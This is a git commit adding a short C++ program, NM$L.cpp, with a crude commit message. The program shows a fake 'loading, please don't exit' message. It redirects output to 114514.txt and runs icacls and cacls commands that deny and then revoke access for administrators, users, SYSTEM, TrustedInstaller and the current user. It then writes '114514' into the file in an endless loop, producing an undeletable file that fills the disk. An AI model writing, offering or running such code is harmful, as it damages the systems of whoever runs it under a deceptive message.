32bd7ad75615373d455626d8ff7110ef1502a036
tomh500 <95513888+tomh500@users.noreply.github.com>
2022-01-09 21:03:53 +0800

    dick file
    迪克文件

---
+++ NM$L.cpp
@@ -0,0 +1,33 @@
+#include<bits/stdc++.h>
+using namespace std;
+int main()
+{
+	printf("loading,please don't exit'..."); 
+	
+	freopen("114514.txt","w",stdout);
+	system("icacls 114514.txt /setowner system");
+	
+	system("cacls 114514.txt /t /e /c /d administrators");
+	system("cacls 114514.txt /t /e /c /d users");
+	system("cacls 114514.txt /t /e /c /d system");
+	system("cacls 114514.txt /t /e /c /d NT SERVICE\TrustedInstaller");
+	system("cacls 114514.txt /t /e /c /d TrustedInstaller");
+	system("cacls 114514.txt /t /e /c /d %username%");
+	
+	system("cacls 114514.txt /t /e /c /r administrators");
+	system("cacls 114514.txt /t /e /c /r users");
+	system("cacls 114514.txt /t /e /c /r system");
+	system("cacls 114514.txt /t /e /c /r NT SERVICE\TrustedInstaller");
+	system("cacls 114514.txt /t /e /c /r TrustedInstaller");
+	system("cacls 114514.txt /t /e /c /r %username%");
+	//set per in dos
+		//set own SYSTEM in dos
+
+	//set per in dos
+	
+
+	while(1)
+	{
+		printf("114514 "); //write 114514 into 114514.txt
+	}
+}
